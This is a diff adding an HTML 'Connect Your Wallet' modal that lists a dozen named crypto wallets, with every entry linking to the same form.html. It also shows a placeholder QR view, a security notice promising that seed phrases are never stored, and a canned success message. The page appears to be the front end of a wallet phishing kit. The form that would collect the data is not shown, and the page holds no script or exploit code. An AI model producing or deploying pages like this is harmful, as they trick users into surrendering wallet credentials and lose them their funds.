@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Document</title>
+       <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+   <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Connect Your Wallet</h2>
+                <a href="index.html">
+                    <button class="close-btn" onclick="closeModal()">&times;</button>
+                </a>
+                
+            </div>
+            <div class="modal-content">
+                <div id="walletSelection">
+                    <div class="tab-toggle">
+                        <div class="tab active" onclick="selectTab(this, 'mobile')">Mobile</div>
+                        <div class="tab" onclick="selectTab(this, 'qr')">QR Code</div>
+                    </div>
+
+                    <div id="mobileView">
+                        <p style="margin-bottom: 20px; color: #666;">Choose your preferred wallet:</p>
+                        <div class="wallet-grid">
+                            <a href="form.html">
+                            <div class="wallet" onclick="selectWallet('Rainbow')">
+                               
+                                 <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #ff0080, #ff8c00, #40e0d0); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">🌈</div>
+                                <span>Rainbow</span>
+                            </div>
+                            </a>
+
+                             <a href="form.html">
+                            <div class="wallet wallet-featured" onclick="selectWallet('Trust Wallet')">
+                                
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #3375bb, #9fa7be); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: rgb(209, 176, 176); font-size: 1.5rem;">🛡️</div>
+                                <span>Trust</span>
+                                </div>
+                            </a>
+                                
+                            
+                            <a href="form.html">
+                                <div class="wallet" onclick="selectWallet('Argent')">
+                                
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">⚡</div>
+                                <span>Argent</span>
+                            </div>
+                            </a>
+                            
+
+                             <a href="form.html">
+                                <div class="wallet" onclick="selectWallet('MetaMask')">
+                               
+                                     <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #f6851b, #e2761b); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">🦊</div>
+                                <span>MetaMask</span>                               
+                            </div>
+                             </a>
+                        
+
+                             <a href="form.html">
+                                <div class="wallet" onclick="selectWallet('Gnosis Safe')">
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #12ff80, #0d8043); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">⚪</div>
+                                <span>Gnosis Safe</span>
+                            </div>
+                             </a>
+                            
+
+                            <a href="form.html">
+                                <div class="wallet" onclick="selectWallet('Crypto.com')">
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #103f68, #1e40af); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">💎</div>
+                                <span>Crypto.com</span>
+                            </div>
+                            </a>
+                            
+
+                            <a href="form.html">
+                                 <div class="wallet" onclick="selectWallet('Pillar')">
+                                
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #00d4aa, #00b894); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">📱</div>
+                                <span>Pillar</span>
+                            </div>
+                            </a>
+                           
+                            <a href="form.html">
+                                <div class="wallet" onclick="selectWallet('imToken')">
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #2980b9, #3498db); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">🔷</div>
+                                <span>imToken</span>
+                            </div>
+                            </a>
+                            
+                             <a href="form.html">
+                                 <div class="wallet" onclick="selectWallet('ONTO')">
+                                 
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #2c3e50, #34495e); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">⭕</div>
+                                <span>ONTO</span>
+                                </div>
+                             </a>
+                           
+                                
+                            
+                            <div class="wallet" onclick="selectWallet('TokenPocket')">
+                                <a href="form.html">
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #2980b9, #3498db); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">💼</div>
+                                <span>TokenPocket</span>
+                                </a>
+                            </div>
+
+                            <div class="wallet" onclick="selectWallet('MathWallet')">
+                                <a href="form.html">
+                                     <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #2c3e50, #95a5a6); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">⚫</div>
+                                <span>MathWallet</span>
+                                </a>
+                            </div>
+
+                            <div class="wallet" onclick="selectWallet('BitPay')">
+                                  <a href="form.html">
+                                    <div style="width: 50px; height: 50px; background: linear-gradient(45deg, #1e3d8f, #3b82f6); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">💳</div>
+                                   <span>BitPay</span>
+                                  </a>
+                            </div>
+                        </div>
+                        
+                        <div class="pagination">
+                            <span class="page-dot active"></span>
+                            <span class="page-dot"></span>
+                            <span class="page-dot"></span>
+                            <span class="page-dot"></span>
+                        </div>
+                    </div>
+
+                    <div id="qrView" class="qr-code">
+                        <p>Scan this QR code with your wallet app:</p>
+                        <div class="qr-placeholder">QR Code will appear here</div>
+                        <p style="font-size: 14px; color: #666;">Open your wallet app and scan the QR code to connect</p>
+                    </div>
+                </div>
+           
+
+                <div class="form-container">
+                    <button class="back-btn" onclick="showWalletSelection()">← Back to Wallet Selection</button>
+                    
+                    <div class="security-notice">
+                        <strong>Security Notice:</strong> Your information is encrypted and secure. We never store your private keys or seed phrases.
+                    </div>
+
+                    <h3 id="formTitle">Connect Your Wallet</h3>
+                    
+                    
+                </div>
+
+                <div id="successMessage" class="form-container" style="text-align: center;">
+                    <div style="font-size: 48px; color: #d2a34c; margin-bottom: 20px;">✓</div>
+                    <h3>Wallet Connected Successfully!</h3>
+                    <p style="color: #666; margin: 20px 0;">Your wallet has been securely connected to our platform.</p>
+                    <button class="submit-btn" onclick="closeModal()">Continue</button>
+                </div>
+               </div>
+        </div>
+    </div>
+</body>
+</html>
